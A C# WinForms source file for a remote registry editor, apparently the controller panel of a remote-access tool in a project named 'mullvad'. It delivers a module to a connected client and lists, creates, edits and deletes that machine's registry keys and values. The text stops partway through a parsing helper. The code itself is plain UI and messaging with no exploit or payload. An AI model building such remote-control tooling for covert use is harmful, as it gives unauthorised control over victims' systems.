using System.Text.Json;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms;

public sealed class RegistryEditorForm : Form
{
    private const string ModuleFile = "mullvad.Module.RegistryEditor";
    private const string ModuleId   = "mullvad.registryeditor";
    private const string DummyTag   = "__dummy__";

    private readonly ClientHandler _handler;
    private ModuleContext?         _ctx;

    // ── Controls ──────────────────────────────────────────────────────────────
    private ToolStrip            toolbar        = null!;
    private ToolStripButton      btnRefresh     = null!;
    private ToolStripButton      btnNewKey      = null!;
    private ToolStripButton      btnDeleteKey   = null!;
    private ToolStripLabel       lblAddress     = null!;
    private ToolStripTextBox     txtAddress     = null!;
    private ToolStripButton      btnGo          = null!;
    private SplitContainer       split          = null!;
    private TreeView             tvRegistry     = null!;
    private ListView             lvValues       = null!;
    private ImageList            treeImages     = null!;
    private ImageList            valueImages    = null!;
    private StatusStrip          statusStrip    = null!;
    private ToolStripStatusLabel statusLabel    = null!;
    private ToolStripProgressBar statusProgress = null!;
    private Panel                loadingPanel   = null!;
    private Label                loadingLabel   = null!;
    private ContextMenuStrip     treeMenu       = null!;
    private ContextMenuStrip     valueMenu      = null!;

    private static readonly Dictionary<ClientHandler, RegistryEditorForm> _openForms = new();

    public static RegistryEditorForm CreateOrActivate(ClientHandler handler)
    {
        if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
        {
            existing.BringToFront();
            return existing;
        }
        var frm = new RegistryEditorForm(handler);
        frm.FormClosed += (_, _) => _openForms.Remove(handler);
        _openForms[handler] = frm;
        return frm;
    }

    private RegistryEditorForm(ClientHandler handler)
    {
        _handler = handler;
        Build();
    }

    // ── Build ─────────────────────────────────────────────────────────────────

    private void Build()
    {
        SuspendLayout();

        Text            = $"Registry Editor — {_handler.Info.Computer}";
        Size            = new Size(1200, 700);
        MinimumSize     = new Size(800, 500);
        StartPosition   = FormStartPosition.CenterScreen;
        Font            = new Font("Segoe UI", 9F);
        KeyPreview      = true;

        // form icon
        var iconBmp = IconLoader.Load("Registry_Editor.png") as Bitmap;
        if (iconBmp is not null) try { Icon = Icon.FromHandle(iconBmp.GetHicon()); } catch { }
        else Icon = SystemIcons.Application;

        // ── Image lists ──────────────────────────────────────────────────────
        treeImages = new ImageList { ColorDepth = ColorDepth.Depth32Bit, ImageSize = new Size(16, 16) };
        var folderImg    = IconLoader.Load("folder.png");
        var registryImg  = IconLoader.Load("Registry_Editor.png") as Bitmap;
        var computerImg  = IconLoader.Load("computer.png");
        if (folderImg   is not null) treeImages.Images.Add("folder",    folderImg);
        if (registryImg is not null) treeImages.Images.Add("hive",      new Bitmap(registryImg, new Size(16, 16)));
        if (computerImg is not null) treeImages.Images.Add("computer",  computerImg);

        valueImages = new ImageList { ColorDepth = ColorDepth.Depth32Bit, ImageSize = new Size(16, 16) };
        var strImg = IconLoader.Load("reg_string.png");
        var binImg = IconLoader.Load("reg_binary.png");
        if (strImg is not null) { valueImages.Images.Add("str", strImg); valueImages.Images.Add("multi", strImg); valueImages.Images.Add("expand", strImg); }
        if (binImg is not null) { valueImages.Images.Add("bin", binImg); valueImages.Images.Add("dword", binImg); valueImages.Images.Add("qword", binImg); }

        // ── Toolbar ──────────────────────────────────────────────────────────
        toolbar = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Padding = new Padding(2) };

        btnRefresh = new ToolStripButton("Refresh") { DisplayStyle = ToolStripItemDisplayStyle.Image, ToolTipText = "Refresh selected key (F5)" };
        var refreshImg = IconLoader.Load("refresh.png");
        if (refreshImg is not null) { btnRefresh.Image = refreshImg; btnRefresh.DisplayStyle = ToolStripItemDisplayStyle.Image; }
        else btnRefresh.DisplayStyle = ToolStripItemDisplayStyle.Text;
        btnRefresh.Click += BtnRefresh_Click;

        btnNewKey = new ToolStripButton("New Key") { ToolTipText = "Create a new subkey" };
        var newImg = IconLoader.Load("add.png");
        if (newImg is not null) { btnNewKey.Image = newImg; btnNewKey.DisplayStyle = ToolStripItemDisplayStyle.Image; }
        else btnNewKey.DisplayStyle = ToolStripItemDisplayStyle.Text;
        btnNewKey.Click += BtnNewKey_Click;

        btnDeleteKey = new ToolStripButton("Delete Key") { ToolTipText = "Delete selected key" };
        var delImg = IconLoader.Load("delete.png");
        if (delImg is not null) { btnDeleteKey.Image = delImg; btnDeleteKey.DisplayStyle = ToolStripItemDisplayStyle.Image; }
        else btnDeleteKey.DisplayStyle = ToolStripItemDisplayStyle.Text;
        btnDeleteKey.Click += BtnDeleteKey_Click;

        lblAddress = new ToolStripLabel("Path: ");
        txtAddress = new ToolStripTextBox { Size = new Size(600, 22), Name = "txtAddress" };
        txtAddress.KeyDown += TxtAddress_KeyDown;

        btnGo = new ToolStripButton("Go") { ToolTipText = "Navigate to typed path (Enter)" };
        var goImg = IconLoader.Load("go.png");
        if (goImg is not null) { btnGo.Image = goImg; btnGo.DisplayStyle = ToolStripItemDisplayStyle.Image; }
        else btnGo.DisplayStyle = ToolStripItemDisplayStyle.Text;
        btnGo.Click += BtnGo_Click;

        toolbar.Items.AddRange(new ToolStripItem[]
        {
            btnRefresh, new ToolStripSeparator(),
            btnNewKey, btnDeleteKey, new ToolStripSeparator(),
            lblAddress, txtAddress, btnGo,
        });

        // ── Tree context menu ─────────────────────────────────────────────────
        treeMenu = new ContextMenuStrip();
        var mnuNewKey     = new ToolStripMenuItem("New Key");
        var mnuDeleteKey  = new ToolStripMenuItem("Delete Key");
        var mnuCopyPath   = new ToolStripMenuItem("Copy Key Path");
        var mnuSepTree    = new ToolStripSeparator();
        var mnuRefreshKey = new ToolStripMenuItem("Refresh");
        mnuNewKey.Click     += BtnNewKey_Click;
        mnuDeleteKey.Click  += BtnDeleteKey_Click;
        mnuCopyPath.Click   += MnuCopyPath_Click;
        mnuRefreshKey.Click += BtnRefresh_Click;
        IconLoader.SetIcon(mnuNewKey,     "application_add.png");
        IconLoader.SetIcon(mnuDeleteKey,  "application_delete.png");
        IconLoader.SetIcon(mnuCopyPath,   "page_copy.png");
        IconLoader.SetIcon(mnuRefreshKey, "refresh.png");
        treeMenu.Items.AddRange(new ToolStripItem[] { mnuNewKey, mnuDeleteKey, mnuCopyPath, mnuSepTree, mnuRefreshKey });

        // ── Value context menu ────────────────────────────────────────────────
        valueMenu = new ContextMenuStrip();
        var mnuNewVal = new ToolStripMenuItem("New Value");
        var mnuNewStr = new ToolStripMenuItem("String Value");         mnuNewStr.Click   += (_, _) => NewValue("REG_SZ");
        var mnuNewDW  = new ToolStripMenuItem("DWORD (32-bit) Value"); mnuNewDW.Click    += (_, _) => NewValue("REG_DWORD");
        var mnuNewQW  = new ToolStripMenuItem("QWORD (64-bit) Value"); mnuNewQW.Click    += (_, _) => NewValue("REG_QWORD");
        var mnuNewBin = new ToolStripMenuItem("Binary Value");         mnuNewBin.Click   += (_, _) => NewValue("REG_BINARY");
        var mnuNewMS  = new ToolStripMenuItem("Multi-String Value");   mnuNewMS.Click    += (_, _) => NewValue("REG_MULTI_SZ");
        var mnuNewExp = new ToolStripMenuItem("Expandable String");    mnuNewExp.Click   += (_, _) => NewValue("REG_EXPAND_SZ");
        IconLoader.SetIcon(mnuNewStr, "reg_string.png");
        IconLoader.SetIcon(mnuNewDW,  "reg_binary.png");
        IconLoader.SetIcon(mnuNewQW,  "reg_binary.png");
        IconLoader.SetIcon(mnuNewBin, "reg_binary.png");
        IconLoader.SetIcon(mnuNewMS,  "reg_string.png");
        IconLoader.SetIcon(mnuNewExp, "reg_string.png");
        mnuNewVal.DropDownItems.AddRange(new ToolStripItem[] { mnuNewStr, mnuNewDW, mnuNewQW, mnuNewBin, mnuNewMS, mnuNewExp });
        var mnuModify   = new ToolStripMenuItem("Modify");
        var mnuDelVal   = new ToolStripMenuItem("Delete Value");
        var mnuSepVal   = new ToolStripSeparator();
        var mnuCopyName = new ToolStripMenuItem("Copy Name");
        var mnuCopyData = new ToolStripMenuItem("Copy Data");
        mnuModify.Click   += MnuModify_Click;
        mnuDelVal.Click   += MnuDeleteValue_Click;
        mnuCopyName.Click += MnuCopyName_Click;
        mnuCopyData.Click += MnuCopyData_Click;
        IconLoader.SetIcon(mnuNewVal,   "application_add.png");
        IconLoader.SetIcon(mnuModify,   "application_edit.png");
        IconLoader.SetIcon(mnuDelVal,   "application_delete.png");
        IconLoader.SetIcon(mnuCopyName, "page_copy.png");
        IconLoader.SetIcon(mnuCopyData, "page_copy.png");
        valueMenu.Items.AddRange(new ToolStripItem[] { mnuNewVal, mnuSepVal, mnuModify, mnuDelVal, new ToolStripSeparator(), mnuCopyName, mnuCopyData });

        // ── TreeView ──────────────────────────────────────────────────────────
        tvRegistry = new TreeView
        {
            Dock             = DockStyle.Fill,
            HideSelection    = false,
            FullRowSelect    = true,
            HotTracking      = true,
            ShowLines        = true,
            ShowPlusMinus    = true,
            ShowRootLines    = true,
            ImageList        = treeImages,
            ContextMenuStrip = treeMenu,
        };
        tvRegistry.BeforeExpand += TvRegistry_BeforeExpand;
        tvRegistry.AfterSelect  += TvRegistry_AfterSelect;

        // ── ListView ─────────────────────────────────────────────────────────
        lvValues = new ListView
        {
            Dock             = DockStyle.Fill,
            View             = View.Details,
            FullRowSelect    = true,
            HideSelection    = false,
            GridLines        = false,
            SmallImageList   = valueImages,
            ContextMenuStrip = valueMenu,
        };
        lvValues.Columns.Add("Name", 220);
        lvValues.Columns.Add("Type", 130);
        lvValues.Columns.Add("Data", 600);
        lvValues.MouseDoubleClick += LvValues_MouseDoubleClick;

        // ── SplitContainer ────────────────────────────────────────────────────
        split = new SplitContainer { Dock = DockStyle.Fill };
        split.Panel1.Controls.Add(tvRegistry);
        split.Panel2.Controls.Add(lvValues);

        // ── Status strip ──────────────────────────────────────────────────────
        statusStrip    = new StatusStrip();
        statusLabel    = new ToolStripStatusLabel("Ready") { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
        statusProgress = new ToolStripProgressBar { Visible = false, Width = 120 };
        statusStrip.Items.AddRange(new ToolStripItem[] { statusLabel, statusProgress });

        // ── Loading overlay ───────────────────────────────────────────────────
        loadingPanel = new Panel { Dock = DockStyle.Fill, Visible = true };
        loadingLabel = new Label
        {
            Text      = "Loading registry editor…",
            AutoSize  = false,
            TextAlign = ContentAlignment.MiddleCenter,
            Dock      = DockStyle.Fill,
            Font      = new Font("Segoe UI", 12F),
        };
        loadingPanel.Controls.Add(loadingLabel);

        Controls.Add(loadingPanel);
        Controls.Add(split);
        Controls.Add(toolbar);
        Controls.Add(statusStrip);

        ResumeLayout();
    }

    // ── OnLoad ────────────────────────────────────────────────────────────────

    protected override async void OnLoad(EventArgs e)
    {
        base.OnLoad(e);
        split.Panel1MinSize    = 180;
        split.Panel2MinSize    = 200;
        split.SplitterDistance = Math.Max(180, Math.Min(340, ClientSize.Width - 204));
        SetBusy(true, "Delivering module…");
        _handler.Disconnected += OnClientDisconnected;
        try
        {
            var moduleBytes = ModuleLoader.GetModuleBytes(ModuleFile);
            if (moduleBytes is null) { SetStatus("Module file not found — build the RegistryEditor project first"); loadingPanel.Visible = false; return; }

            using var deliveryCts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
            bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, moduleBytes, null, deliveryCts.Token);
            if (!ok) { SetStatus("Module delivery failed"); loadingPanel.Visible = false; return; }

            _ctx = new ModuleContext(_handler, ModuleId);
            _ctx.Disconnected += (_, _) => BeginInvoke(() => OnClientDisconnected(_handler));

            loadingPanel.Visible = false;
            SetBusy(false);

            PopulateRoots();
        }
        catch (Exception ex)
        {
            SetStatus("Error: " + ex.Message);
            loadingPanel.Visible = false;
            SetBusy(false);
        }
    }

    protected override void OnFormClosed(FormClosedEventArgs e)
    {
        _handler.Disconnected -= OnClientDisconnected;
        _ctx?.Dispose();
        base.OnFormClosed(e);
    }

    private void OnClientDisconnected(ClientHandler _)
    {
        if (IsDisposed) return;
        BeginInvoke(() => { if (!IsDisposed) Close(); });
    }

    // ── Root population ───────────────────────────────────────────────────────

    private void PopulateRoots()
    {
        tvRegistry.BeginUpdate();
        tvRegistry.Nodes.Clear();

        string[] hives = { "HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG" };
        foreach (var hive in hives)
        {
            var node = tvRegistry.Nodes.Add(hive, hive, "hive", "hive");
            node.Tag = hive;
            node.Nodes.Add(new TreeNode("") { Tag = DummyTag });
        }
        tvRegistry.EndUpdate();
        SetStatus("Ready — select a key to view values");
    }

    // ── Tree expansion ────────────────────────────────────────────────────────

    private void TvRegistry_BeforeExpand(object? sender, TreeViewCancelEventArgs e)
    {
        var node = e.Node;
        if (node.Nodes.Count == 1 && node.Nodes[0].Tag is string s && s == DummyTag)
        {
            e.Cancel = true;
            _ = ExpandNodeAsync(node);
        }
    }

    private async Task ExpandNodeAsync(TreeNode node)
    {
        if (_ctx is null || IsDisposed) return;
        var path = node.Tag as string;
        if (path is null) return;

        SetBusy(true, $"Loading {path}…");
        string? json = null;
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
            json = await _ctx.ExecuteAsync("list_keys", $"{{\"path\":{JsonStr(path)}}}", cts.Token);
        }
        catch { }

        if (IsDisposed) return;
        BeginInvoke(() =>
        {
            tvRegistry.BeginUpdate();
            node.Nodes.Clear();

            if (json != null && !json.StartsWith("{\"error\""))
            {
                var keys = ParseStringArray(json);
                foreach (var key in keys.OrderBy(k => k, StringComparer.OrdinalIgnoreCase))
                {
                    var childPath = path + "\\" + key;
                    var child     = new TreeNode(key) { Tag = childPath, ImageKey = "folder", SelectedImageKey = "folder" };
                    child.Nodes.Add(new TreeNode("") { Tag = DummyTag });
                    node.Nodes.Add(child);
                }
            }

            tvRegistry.EndUpdate();
            if (!node.IsExpanded)
                node.Expand();

            SetBusy(false);
            SetStatus($"{node.Nodes.Count} subkeys — {path}");
        });
    }

    private void TvRegistry_AfterSelect(object? sender, TreeViewEventArgs e)
    {
        var path = e.Node.Tag as string;
        if (path is null || path == DummyTag) return;
        txtAddress.Text = path;
        _ = LoadValuesAsync(path);
    }

    // ── Value loading ─────────────────────────────────────────────────────────

    private async Task LoadValuesAsync(string path)
    {
        if (_ctx is null || IsDisposed) return;
        SetBusy(true, $"Loading values for {path}…");

        string? json = null;
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
            json = await _ctx.ExecuteAsync("list_values", $"{{\"path\":{JsonStr(path)}}}", cts.Token);
        }
        catch { }

        if (IsDisposed) return;
        BeginInvoke(() =>
        {
            lvValues.BeginUpdate();
            lvValues.Items.Clear();

            if (json != null && !json.StartsWith("{\"error\""))
            {
                var values = ParseValueArray(json);
                foreach (var (name, type, data) in values)
                {
                    var displayName = string.IsNullOrEmpty(name) ? "(Default)" : name;
                    var lvi         = new ListViewItem(displayName) { Tag = name };
                    lvi.SubItems.Add(type);
                    lvi.SubItems.Add(data);
                    lvi.ImageKey = TypeToImageKey(type);
                    lvValues.Items.Add(lvi);
                }
            }
            else if (json != null && json.StartsWith("{\"error\""))
            {
                var err  = new ListViewItem("(error reading values)") { ForeColor = Color.Red };
                err.SubItems.Add(""); err.SubItems.Add(json);
                lvValues.Items.Add(err);
            }

            lvValues.EndUpdate();
            SetBusy(false);
            SetStatus($"{lvValues.Items.Count} values — {path}");
        });
    }

    // ── Toolbar/menu handlers ─────────────────────────────────────────────────

    private void BtnRefresh_Click(object? sender, EventArgs e)
    {
        var node = tvRegistry.SelectedNode;
        if (node is null) return;
        var path = node.Tag as string;
        if (path is null || path == DummyTag) return;

        // Re-expand tree node
        if (node.IsExpanded)
        {
            node.Collapse();
            node.Nodes.Clear();
            node.Nodes.Add(new TreeNode("") { Tag = DummyTag });
            _ = ExpandNodeAsync(node);
        }
        else
        {
            _ = LoadValuesAsync(path);
        }
    }

    private void BtnNewKey_Click(object? sender, EventArgs e)
    {
        var node = tvRegistry.SelectedNode;
        if (node is null) { SetStatus("Select a key first"); return; }
        var parentPath = node.Tag as string;
        if (parentPath is null || parentPath == DummyTag) return;

        var newName = ShowInputDialog("New Key", "Enter name for the new key:", "NewKey");
        if (string.IsNullOrEmpty(newName)) return;

        _ = CreateKeyAsync(parentPath + "\\" + newName);
    }

    private void BtnDeleteKey_Click(object? sender, EventArgs e)
    {
        var node = tvRegistry.SelectedNode;
        if (node is null) { SetStatus("Select a key first"); return; }
        var path = node.Tag as string;
        if (path is null || path == DummyTag) return;

        if (MessageBox.Show(this,
            $"Delete key and all subkeys?\n\n{path}", "Confirm Delete",
            MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes)
            return;

        _ = DeleteKeyAsync(path, node);
    }

    private void TxtAddress_KeyDown(object? sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Enter) { e.SuppressKeyPress = true; NavigateToPath(txtAddress.Text.Trim()); }
    }

    private void BtnGo_Click(object? sender, EventArgs e) => NavigateToPath(txtAddress.Text.Trim());

    private void MnuCopyPath_Click(object? sender, EventArgs e)
    {
        var path = tvRegistry.SelectedNode?.Tag as string;
        if (!string.IsNullOrEmpty(path)) Clipboard.SetText(path);
    }

    private void MnuModify_Click(object? sender, EventArgs e)
    {
        if (lvValues.SelectedItems.Count == 0) return;
        EditSelectedValue();
    }

    private void MnuDeleteValue_Click(object? sender, EventArgs e)
    {
        if (lvValues.SelectedItems.Count == 0) return;
        var item     = lvValues.SelectedItems[0];
        var rawName  = item.Tag as string ?? "";
        var path     = tvRegistry.SelectedNode?.Tag as string;
        if (path is null) return;

        if (MessageBox.Show(this,
            $"Delete value '{(string.IsNullOrEmpty(rawName) ? "(Default)" : rawName)}'?", "Confirm Delete",
            MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes)
            return;

        _ = DeleteValueAsync(path, rawName);
    }

    private void MnuCopyName_Click(object? sender, EventArgs e)
    {
        if (lvValues.SelectedItems.Count == 0) return;
        Clipboard.SetText(lvValues.SelectedItems[0].Text);
    }

    private void MnuCopyData_Click(object? sender, EventArgs e)
    {
        if (lvValues.SelectedItems.Count == 0) return;
        Clipboard.SetText(lvValues.SelectedItems[0].SubItems[2].Text);
    }

    private void LvValues_MouseDoubleClick(object? sender, MouseEventArgs e) => EditSelectedValue();

    private void EditSelectedValue()
    {
        if (lvValues.SelectedItems.Count == 0) return;
        var item    = lvValues.SelectedItems[0];
        var rawName = item.Tag as string ?? "";
        var type    = item.SubItems[1].Text;
        var data    = item.SubItems[2].Text;
        var path    = tvRegistry.SelectedNode?.Tag as string;
        if (path is null) return;

        var newData = ShowValueEditDialog(item.Text, type, data);
        if (newData is null) return;

        _ = SetValueAsync(path, rawName, type, newData);
    }

    private void NewValue(string type)
    {
        var path = tvRegistry.SelectedNode?.Tag as string;
        if (path is null) { SetStatus("Select a key first"); return; }

        var name = ShowInputDialog("New Value", "Enter value name:", "NewValue");
        if (name is null) return;

        string defaultData = type == "REG_DWORD" || type == "REG_QWORD" ? "0" : "";
        var data = ShowValueEditDialog(string.IsNullOrEmpty(name) ? "(Default)" : name, type, defaultData);
        if (data is null) return;

        _ = SetValueAsync(path, name, type, data);
    }

    // ── Async operations ──────────────────────────────────────────────────────

    private async Task CreateKeyAsync(string fullPath)
    {
        if (_ctx is null) return;
        SetBusy(true, "Creating key…");
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(20));
            var json = await _ctx.ExecuteAsync("create_key", $"{{\"path\":{JsonStr(fullPath)}}}", cts.Token);
            if (IsDisposed) return;
            BeginInvoke(() =>
            {
                SetBusy(false);
                if (json?.Contains("\"success\"") == true)
                {
                    SetStatus($"Created: {fullPath}");
                    // Refresh parent node
                    var parentNode = tvRegistry.SelectedNode;
                    if (parentNode?.IsExpanded == true)
                    {
                        parentNode.Collapse();
                        parentNode.Nodes.Clear();
                        parentNode.Nodes.Add(new TreeNode("") { Tag = DummyTag });
                        _ = ExpandNodeAsync(parentNode);
                    }
                }
                else SetStatus("Create key failed: " + json);
            });
        }
        catch (Exception ex) { if (!IsDisposed) BeginInvoke(() => { SetBusy(false); SetStatus("Error: " + ex.Message); }); }
    }

    private async Task DeleteKeyAsync(string path, TreeNode node)
    {
        if (_ctx is null) return;
        SetBusy(true, "Deleting key…");
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(20));
            var json = await _ctx.ExecuteAsync("delete_key", $"{{\"path\":{JsonStr(path)}}}", cts.Token);
            if (IsDisposed) return;
            BeginInvoke(() =>
            {
                SetBusy(false);
                if (json?.Contains("\"success\"") == true)
                {
                    SetStatus($"Deleted: {path}");
                    lvValues.Items.Clear();
                    var parent = node.Parent;
                    node.Remove();
                    if (parent != null) tvRegistry.SelectedNode = parent;
                }
                else SetStatus("Delete failed: " + json);
            });
        }
        catch (Exception ex) { if (!IsDisposed) BeginInvoke(() => { SetBusy(false); SetStatus("Error: " + ex.Message); }); }
    }

    private async Task SetValueAsync(string keyPath, string name, string type, string data)
    {
        if (_ctx is null) return;
        SetBusy(true, "Writing value…");
        try
        {
            var payload = $"{{\"path\":{JsonStr(keyPath)},\"name\":{JsonStr(name)},\"type\":{JsonStr(type)},\"data\":{JsonStr(data)}}}";
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(20));
            var json = await _ctx.ExecuteAsync("set_value", payload, cts.Token);
            if (IsDisposed) return;
            BeginInvoke(() =>
            {
                SetBusy(false);
                if (json?.Contains("\"success\"") == true) { SetStatus($"Value set: {name}"); _ = LoadValuesAsync(keyPath); }
                else SetStatus("Set value failed: " + json);
            });
        }
        catch (Exception ex) { if (!IsDisposed) BeginInvoke(() => { SetBusy(false); SetStatus("Error: " + ex.Message); }); }
    }

    private async Task DeleteValueAsync(string keyPath, string name)
    {
        if (_ctx is null) return;
        SetBusy(true, "Deleting value…");
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(20));
            var json = await _ctx.ExecuteAsync("delete_value", $"{{\"path\":{JsonStr(keyPath)},\"name\":{JsonStr(name)}}}", cts.Token);
            if (IsDisposed) return;
            BeginInvoke(() =>
            {
                SetBusy(false);
                if (json?.Contains("\"success\"") == true) { SetStatus($"Deleted value: {name}"); _ = LoadValuesAsync(keyPath); }
                else SetStatus("Delete value failed: " + json);
            });
        }
        catch (Exception ex) { if (!IsDisposed) BeginInvoke(() => { SetBusy(false); SetStatus("Error: " + ex.Message); }); }
    }

    // ── Navigate to path ──────────────────────────────────────────────────────

    private void NavigateToPath(string path)
    {
        if (string.IsNullOrEmpty(path)) return;
        _ = NavigateAsync(path);
    }

    private async Task NavigateAsync(string targetPath)
    {
        if (_ctx is null || IsDisposed) return;

        // Normalise: accept HKLM, HKCU etc.
        var parts = NormalisePath(targetPath);
        if (parts is null || parts.Length == 0) return;

        // Find root node
        var root = tvRegistry.Nodes.Cast<TreeNode>()
            .FirstOrDefault(n => NormalisePath(n.Tag as string ?? "")?[0] == parts[0]);
        if (root is null) return;

        tvRegistry.SelectedNode = root;
        TreeNode current        = root;

        for (int i = 1; i < parts.Length; i++)
        {
            // Ensure node is expanded
            if (current.Nodes.Count == 1 && current.Nodes[0].Tag is string s && s == DummyTag)
            {
                await ExpandNodeAndWaitAsync(current);
                if (IsDisposed) return;
            }

            var part = parts[i];
            var next = current.Nodes.Cast<TreeNode>()
                .FirstOrDefault(n => string.Equals(n.Text, part, StringComparison.OrdinalIgnoreCase));
            if (next is null) { SetStatus($"Key not found: {part}"); return; }

            current = next;
        }

        tvRegistry.SelectedNode = current;
        current.EnsureVisible();
        _ = LoadValuesAsync(targetPath);
    }

    private async Task ExpandNodeAndWaitAsync(TreeNode node)
    {
        var tcs = new TaskCompletionSource<bool>();

        TreeViewEventHandler handler = null!;
        handler = (_, e) =>
        {
            if (e.Node == node) { tvRegistry.AfterExpand -= handler; tcs.TrySetResult(true); }
        };
        tvRegistry.AfterExpand += handler;

        node.Nodes.Clear();
        node.Nodes.Add(new TreeNode("") { Tag = DummyTag });
        _ = ExpandNodeAsync(node);

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(15));
        cts.Token.Register(() => { tvRegistry.AfterExpand -= handler; tcs.TrySetResult(false); });
        await tcs.Task;
    }

    private static string[]? NormalisePath(string path)
    {
        if (string.IsNullOrEmpty(path)) return null;
        var map = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["HKLM"]   = "HKEY_LOCAL_MACHINE",
            ["HKCU"]   = "HKEY_CURRENT_USER",
            ["HKCR"]   = "HKEY_CLASSES_ROOT",
            ["HKU"]    = "HKEY_USERS",
            ["HKCC"]   = "HKEY_CURRENT_CONFIG",
        };
        var parts = path.Split('\\');
        if (map.TryGetValue(parts[0], out var full)) parts[0] = full;
        return parts;
    }

    // ── Dialogs ───────────────────────────────────────────────────────────────

    private string? ShowInputDialog(string title, string prompt, string defaultValue)
    {
        using var dlg    = new Form();
        dlg.Text         = title;
        dlg.Size         = new Size(420, 140);
        dlg.FormBorderStyle = FormBorderStyle.FixedDialog;
        dlg.MaximizeBox  = false;
        dlg.MinimizeBox  = false;
        dlg.StartPosition = FormStartPosition.CenterParent;
        dlg.Font         = Font;

        var lbl  = new Label  { Text = prompt, Left = 10, Top = 12, Width = 390 };
        var tb   = new TextBox { Text = defaultValue, Left = 10, Top = 34, Width = 390 };
        var ok   = new Button { Text = "OK",     DialogResult = DialogResult.OK,     Left = 230, Top = 72, Width = 80 };
        var can  = new Button { Text = "Cancel", DialogResult = DialogResult.Cancel, Left = 320, Top = 72, Width = 80 };
        dlg.AcceptButton = ok;
        dlg.CancelButton = can;
        dlg.Controls.AddRange(new Control[] { lbl, tb, ok, can });
        tb.SelectAll();

        if (dlg.ShowDialog(this) != DialogResult.OK) return null;
        return tb.Text.Trim();
    }

    private string? ShowValueEditDialog(string displayName, string type, string currentData)
    {
        using var dlg = new Form();
        dlg.Text      = $"Edit {type}";
        dlg.Size      = new Size(520, type == "REG_MULTI_SZ" ? 340 : 200);
        dlg.MinimumSize = new Size(400, 180);
        dlg.FormBorderStyle = FormBorderStyle.Sizable;
        dlg.MaximizeBox = false;
        dlg.StartPosition = FormStartPosition.CenterParent;
        dlg.Font      = Font;

        var lbl  = new Label { Text = $"Value name: {displayName}", Left = 10, Top = 10, Width = 490, AutoSize = false, Height = 20 };
        var hint = new Label { Text = $"Type: {type}",              Left = 10, Top = 30, Width = 490, AutoSize = false, Height = 18, ForeColor = SystemColors.GrayText };

        Control dataCtrl;
        int     ctrlTop    = 55;
        int     ctrlHeight = 80;

        if (type == "REG_MULTI_SZ")
        {
            var tb = new TextBox
            {
                Multiline  = true,
                Text       = currentData.Replace("\n", "\r\n"),
                Left       = 10, Top = ctrlTop, Width = 490, Height = ctrlHeight,
                Anchor     = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top | AnchorStyles.Bottom,
                ScrollBars = ScrollBars.Both,
                WordWrap   = false,
            };
            dataCtrl  = tb;
            ctrlHeight = 110;
            dlg.Size  = new Size(520, 240);
        }
        else
        {
            var tb = new TextBox { Text = currentData, Left = 10, Top = ctrlTop, Width = 490,
                Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top };
            dataCtrl = tb;
            dlg.Size = new Size(520, 185);
        }

        var ok  = new Button { Text = "OK",     DialogResult = DialogResult.OK };
        var can = new Button { Text = "Cancel", DialogResult = DialogResult.Cancel };
        ok.Anchor  = AnchorStyles.Bottom | AnchorStyles.Right;
        can.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
        ok.Size    = new Size(80, 26);
        can.Size   = new Size(80, 26);

        dlg.AcceptButton = ok;
        dlg.CancelButton = can;

        dlg.Resize += (_, _) =>
        {
            int btnTop = dlg.ClientSize.Height - 36;
            ok.Location  = new Point(dlg.ClientSize.Width - 172, btnTop);
            can.Location = new Point(dlg.ClientSize.Width - 88,  btnTop);
            if (dataCtrl is TextBox tb2 && tb2.Multiline)
                tb2.Height = dlg.ClientSize.Height - ctrlTop - 50;
        };
        dlg.Resize += (_, _) => { }; // trigger initial layout
        dlg.Controls.AddRange(new Control[] { lbl, hint, dataCtrl, ok, can });

        // Manually position buttons once
        int bTop = dlg.ClientSize.Height - 36;
        ok.Location  = new Point(dlg.ClientSize.Width - 172, bTop);
        can.Location = new Point(dlg.ClientSize.Width - 88,  bTop);

        if (dlg.ShowDialog(this) != DialogResult.OK) return null;

        if (type == "REG_MULTI_SZ")
            return ((TextBox)dataCtrl).Text.Replace("\r\n", "\n").Replace("\r", "\n").TrimEnd('\n');

        return ((TextBox)dataCtrl).Text;
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private void SetBusy(bool busy, string? msg = null)
    {
        statusProgress.Visible = busy;
        if (msg is not null) statusLabel.Text = msg;
    }

    private void SetStatus(string msg) => statusLabel.Text = msg;

    private static string JsonStr(string s)
    {
        if (s == null) return "\"\"";
        var sb = new System.Text.StringBuilder("\"");
        foreach (char c in s)
        {
            switch (c)
            {
                case '\\': sb.Append("\\\\"); break;
                case '"':  sb.Append("\\\""); break;
                case '\r': sb.Append("\\r");  break;
                case '\n': sb.Append("\\n");  break;
                case '\t': sb.Append("\\t");  break;
                default:
                    if (c < 0x20) sb.Append("\\u").Append(((int)c).ToString("X4"));
                    else          sb.Append(c);
                    break;
            }
        }
        sb.Append('"');
        return sb.ToString();
    }

    private static List<string> ParseStringArray(string json)
    {
        var result = new List<string>();
        if (string.IsNullOrEmpty(json)) return result;
        int i = json.IndexOf('[');
        if (i < 0) return result;
        i++;
        while (i < json.Length)
        {
            while (i < json.Length && json[i] != '"' && json[i] != ']') i++;
            if (i >= json.Length || json[i] == ']') break;
            i++; // skip "
            var sb = new System.Text.StringBuilder();
